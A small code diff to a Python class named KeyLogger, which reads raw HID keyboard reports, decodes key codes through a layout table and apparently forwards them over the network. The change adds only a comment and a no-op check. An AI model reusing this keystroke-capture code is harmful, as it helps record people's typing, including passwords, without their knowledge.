@@ -79,6 +79,7 @@ class KeyLogger:
                 data = keyboard.read(8)  # Read an 8-byte HID report
             except OSError:
                 logging.error("Keyboard no longer connected")
+                # close all network sockets
                 del self.__forwarder
                 exit()
             if data:
@@ -87,6 +88,8 @@ class KeyLogger:
                     try:
                         print(f"{key_code=} ")
                         offset: int = self.keyboard_layout[str(key_code)]
+                        if offset is None:
+                            pass
                     except KeyError:
                         pass
                     char: chr = chr(offset + key_code)
